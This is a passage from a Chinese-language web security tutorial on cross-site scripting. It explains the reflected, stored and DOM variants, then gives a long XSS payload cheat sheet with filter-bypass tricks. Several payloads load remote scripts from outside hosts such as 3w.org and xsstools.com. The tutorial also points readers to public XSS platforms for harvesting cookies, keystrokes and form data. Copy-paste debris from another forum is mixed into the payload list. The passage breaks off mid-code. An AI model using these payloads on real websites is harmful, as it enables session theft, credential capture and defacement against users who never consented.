class="mord mathnormal">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">将</span></span></span></span>_GET [‘mssage’] 复制给 $html 变量中，而且没有任何过滤再输出到页面中，所以直接输入页面会直接输出 xss 信息，就会造成 xss 攻击；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670175979-5a5a67dd-5390-4beb-8eff-cf8fc1838fc5.png" alt="img"></p><h2 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss">#</a> 存储型 XSS</h2><p>存储型 XSS，持久化，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670403710-ca1f691e-953c-413a-b8cb-f117f0ddad8f.png" alt="img"></p><h4 id="代码分析-2"><a class="markdownIt-Anchor" href="#代码分析-2">#</a> 代码分析</h4><p>在存储型 xss 代码分析中，看到留言的 inster into 语句中，直接插入留言信息， 没有任何过滤，输入恶意代码，这个代码将记录在数据中；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670504596-17163a1f-00f7-4764-948a-ce475c6c0311.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670616784-e6c094f2-d7e9-4bac-b5c4-34d31a73705c.png" alt="img"></p><p>浏览器在访问该页面的时，恶意代码会从数据库字段里取出这条记录，没有经过任何处理就直接输出；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670670614-250bc148-6241-44cb-b062-ebc7b28cc43a.png" alt="img"></p><p>访问页面，调用代码，执行代码；</p><h2 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss">#</a> DOM 型 XSS</h2><p>DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用；</p><p>经常出现 dom xss 的关键语句：</p><ul><li><ul><li>document.referer 属性</li><li><span class="exturl" data-url="aHR0cDovL3dpbmRvdy5uYW1l">window.name</span> 属性</li></ul></li><li><ul><li>location 属性</li><li>innerHTML 属性</li></ul></li><li><ul><li>documen.write 属性</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670984283-204e91b2-19b4-4ea0-8f41-7a796a5468a6.png" alt="img"></p><h4 id="代码分析-3"><a class="markdownIt-Anchor" href="#代码分析-3">#</a> 代码分析</h4><p>DOM 型 xss 程序中，只有 html 代码，dom 通过操作 HTML 或者 css 实现 HTML 属性、方法、事件，因此程序中没有与服务器进行交互；</p><p>点击按钮时，会调用 domxss () 函数，跟踪 domxss 函数；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function domxss()&#123;</span><br><span class="line">var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do yousee?&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取 id text 文本的值，修改 id 为 dom 的 html 值，输入 ’ onclick=“alert (‘dom xss 漏洞’)”&gt; 闭合前面的单引号，即可；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631671123576-8cf16755-897f-4755-9c61-b95ce6b54812.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631671421496-260f589a-16c7-44a2-b940-3745afeb70ce.png" alt="img"></p><h1 id="xss-测试语句"><a class="markdownIt-Anchor" href="#xss-测试语句">#</a> xss 测试语句</h1><p>在网站是否存在 xss 漏洞时，应该输入一些标签如 &lt;、&gt; 输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞；</p><p>常用的测试语句：</p><ul><li><ul><li><code>&lt;h5&gt;1&lt;/h5&gt;</code></li><li><code>&lt;span&gt;1&lt;/span&gt;</code></li></ul></li><li><ul><li><code>&lt;script&gt;console.log(1);&lt;/script&gt;</code></li></ul></li></ul><p>闭合：</p><ul><li><ul><li><code>&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&quot;</code></li><li><code>'&gt;&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;'</code></li></ul></li></ul><p>单行注释：</p><ul><li><ul><li><code>&quot;&gt;&lt;span&gt;x&lt;/span&gt;//</code></li></ul></li></ul><h1 id="xss-攻击语句"><a class="markdownIt-Anchor" href="#xss-攻击语句">#</a> xss 攻击语句</h1><h4 id="xss-攻击代码"><a class="markdownIt-Anchor" href="#xss-攻击代码">#</a> xss 攻击代码：</h4><p>常用语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br><span class="line">&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;aa&lt;/a&gt;</span><br><span class="line">(1)普通的 XSS JavaScript 注入</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(2)IMG 标签 XSS 使用 JavaScript 命令</span><br><span class="line">&lt;IMG SRC=http://3w.org/XSS/xss.js/&gt;</span><br><span class="line">(3)IMG 标签无分号无引号</span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">(4)IMG 标签大小写不敏感</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">(5)HTML 编码(必须有分号)</span><br><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br><span class="line">(6)修正缺陷 IMG 标签</span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">(7)formCharCode 标签(计算器)</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">(8)UTF-8 的 Unicode 编码(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line">(9)7 位的 UTF-8 的 Unicode 编码是没有分号的(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">(11)嵌入式标签,将 Javascript 分开</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(12)嵌入式编码标签,将 Javascript 分开</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(13)嵌入式换行符</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(14)嵌入式回车</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(15)嵌入式多行注入 JavaScript,这是 XSS 极端的例子</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;&lt;s</span><br><span class="line">cript&gt;z=z+&#x27;</span><br><span class="line">src=ht&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;tp://ww&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;w.shell&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;.ne</span><br><span class="line">t/1.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;js&gt;&lt;/sc&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;</span><br><span class="line">/script&gt;</span><br><span class="line">(17)空字符 12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 2/6perl -e &#x27;print &quot;&lt;IMG</span><br><span class="line">SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line">(18)空字符 2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line">perl -e &#x27;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&#x27; &gt; out</span><br><span class="line">(19)Spaces 和 meta 前的 IMG 标签</span><br><span class="line">&lt;IMG SRC=&quot; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line">&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(23)双开括号</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line">&lt;SCRIPT SRChttp://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line">(25)无结束脚本标记 2</span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line">(26)半开的 HTML/JavaScript XSS</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line">(27)双开角括号</span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">(29)换码过滤的 JavaScript</span><br><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br><span class="line">(30)结束 Title 标签</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br><span class="line">(31)Input Image</span><br><span class="line">&lt;INPUT SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(32)BODY Image</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(33)BODY 标签</span><br><span class="line">&lt;BODY(&#x27;XSS&#x27;)&gt;</span><br><span class="line">(34)IMG Dynsrc</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(35)IMG Lowsrc</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(36)BGSOUND</span><br><span class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(37)STYLE sheet</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(38)远程样式表</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;</span><br><span class="line">(39)List-style-image(列表式)</span><br><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line">(40)IMG VBscript</span><br><span class="line">&lt;IMG SRC=&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line">(41)META 链接 url</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;URL=http://;URL=javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(42)Iframe</span><br><span class="line">&lt;IFRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/IFRAME&gt;</span><br><span class="line">(43)Frame</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/FRAMESET&gt;12-7-1 T00LS - Powered by Discuz!</span><br><span class="line">Boardhttps://www.a.com/viewthread.php?action=printable&amp;tid=15267 3/6</span><br><span class="line">(44)Table</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(45)TD</span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(46)DIV background-image</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(47)DIV background-image 后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(48)DIV expression</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression_r(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line">(49)STYLE 属性分拆表达</span><br><span class="line">&lt;IMG STYLE=&quot;xss:expression_r(alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(50)匿名 STYLE(组成:开角号和一个字母开头)</span><br><span class="line">&lt;XSS STYLE=&quot;xss:expression_r(alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(51)STYLE background-image</span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;ACLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line">(52)IMG STYLE 方式</span><br><span class="line">exppression(alert(&quot;XSS&quot;))&#x27;&gt;</span><br><span class="line">(53)STYLE background</span><br><span class="line">&lt;STYLE&gt;&lt;STYLEtype=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">(54)BASE</span><br><span class="line">&lt;BASE HREF=&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;&gt;</span><br><span class="line">(55)EMBED 标签,你可以嵌入 FLASH,其中包涵 XSS</span><br><span class="line">&lt;EMBED SRC=&quot;http://3w.org/XSS/xss.swf&quot; &gt;&lt;/EMBED&gt;</span><br><span class="line">(56)在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL(\&quot;&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#x27;XSS&#x27;);\&quot;)&quot;;eval_r(a+b+c+d);</span><br><span class="line">(57)XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上</span><br><span class="line">&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot;</span><br><span class="line">implementation=&quot;http://3w.org/XSS/xss.htc&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;</span><br><span class="line">(58)如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用</span><br><span class="line">&lt;SCRIPT SRC=&quot;&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(59)IMG 嵌入式命令,可执行任意命令</span><br><span class="line">&lt;IMG SRC=&quot;http://www.a.com/a.php?a=b&quot;&gt;</span><br><span class="line">(60)IMG 嵌入式命令(a.jpg 在同服务器)</span><br><span class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</span><br><span class="line">(61)绕符号过滤</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(62)&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(63)&lt;SCRIPT a=&quot;&gt;&quot; &quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(64)&lt;SCRIPT &quot;a=&#x27;&gt;&#x27;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(65)&lt;SCRIPT a=`&gt;` SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(66)12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 4/6&lt;SCRIPT a=&quot;&gt;&#x27;&gt;&quot;</span><br><span class="line">SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(67)&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(68)URL 绕行</span><br><span class="line">&lt;A HREF=&quot;http://127.0.0.1/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(69)URL 编码</span><br><span class="line">&lt;A HREF=&quot;http://3w.org&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(70)IP 十进制</span><br><span class="line">&lt;A HREF=&quot;http://3232235521″&gt;XSS&lt;/A&gt;</span><br><span class="line">(71)IP 十六进制</span><br><span class="line">&lt;A HREF=&quot;http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</span><br><span class="line">(72)IP 八进制</span><br><span class="line">&lt;A HREF=&quot;http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</span><br><span class="line">(73)混合编码</span><br><span class="line">&lt;A HREF=&quot;http://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(74)节省[http:]</span><br><span class="line">&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(75)节省[www]</span><br><span class="line">&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(76)绝对点绝对 DNS</span><br><span class="line">&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(77)javascript 链接</span><br><span class="line">&lt;A HREF=&quot;javascript:document.location=&#x27;http://www.google.com/&#x27;&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure><h1 id="加载远程攻击的-payload"><a class="markdownIt-Anchor" href="#加载远程攻击的-payload">#</a> 加载远程攻击的 payload</h1><p>常见的标准 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">注意 网站采用的协议:</span><br><span class="line">&lt;script src=&quot;http://192.168.0.121/xss.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://192.168.0.121/xss.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">自动选择协议:</span><br><span class="line">&lt;script src=//192.168.0.121/xss.js&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">图片创建加载连接:</span><br><span class="line">&lt;img src=&#x27;&#x27;</span><br><span class="line">onerror=document.body.appendChild(document.createElement(&#x27;script&#x27;)).src=&#x27;//192.168.0.110/xss.</span><br><span class="line">js&#x27;&gt;</span><br><span class="line"></span><br><span class="line">字符并接</span><br><span class="line">这种一般是输入的字符有限制的时候使用:</span><br><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27; src=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;tp://www.&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;xsstools&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;.com/a&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;mER&gt;&lt;/sc&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;</span><br><span class="line">有的情况要用/**/注释不需要的代码。</span><br><span class="line"></span><br><span class="line">jquery 加载：</span><br><span class="line">&lt;script&gt;$.getScript(&quot;//www.xsstools.com/amER&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="利用xss平台"><a class="markdownIt-Anchor" href="#利用xss平台">#</a> 利用 XSS 平台</h1><p>在初步探测到 xss 漏洞时，此时我们可以使用 xss 在线平台，去获取一些我们需要的信息，比如位置、键盘记录、ip、表单挟持…</p><p>公网 xss 平台：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly94c3MucHQveHNzLnBocD9kbz1sb2dpbg==">https://xss.pt/xss.php?do=login</span></li><li><span class="exturl" data-url="aHR0cHM6Ly94c3Nocy5jbi94c3MucGhwP2RvPWxvZ2lu">https://xsshs.cn/xss.php?do=login</span></li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly94c3NhcS5jb20veHNzLnBocD9kbz1sb2dpbg==">https://xssaq.com/xss.php?do=login</span></li><li><span class="exturl" data-url="aHR0cHM6Ly94cy5zYi9sb2dpbi8=">https://xs.sb/login/</span></li></ul></li></ul><p>也可以自己搭建：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzc4Nzc4NDQzL3hzc3BsYXRmb3Jt">https://github.com/78778443/xssplatform</span></li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631673256678-59fbc195-047a-430c-a1a8-7bd6a92cf020.png" alt="img"></p><p>COOKIE 介绍：</p><ul><li><ul><li>Cookie 是一些数据，存储于你电脑上的文本文件中</li><li>当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息</li></ul></li><li><ul><li>Cookie 的作用就是用于解决 “如何记录客户端的用户信息”</li><li>当用户访问 web 页面时，登录信息可以记录在 cookie 中</li></ul></li><li><ul><li>在用户下一次访问该页面时，可以在 cookie 中读取用户访问记录</li><li>cookie 是有时效性的且遵循同源策略</li></ul></li></ul><p>COOKIE 伪造浏览器插件：</p><ul><li><ul><li>EditThisCookie</li></ul></li></ul><h1 id="xss绕过"><a class="markdownIt-Anchor" href="#xss绕过">#</a> XSS 绕过</h1><h3 id="gpc-过滤字符"><a class="markdownIt-Anchor" href="#gpc-过滤字符">#</a> gpc 过滤字符</h3><p>如果 gpc 开启的时候，特殊字符会被加上斜杠即，‘变成’ ，xss 攻击代码不要带用单引号或双引号。</p><p>绕过 gpc 在 php 高版本 gpc 默认是没有的，但是开发程序员会使用 addcslashes () 对特殊字符进行转义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个是执行不了的</span><br><span class="line">&lt;script src=&#x27;http://www.xss123.com/JGdbsl?1623638390&#x27;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">没有单引号可执行</span><br><span class="line">&lt;script 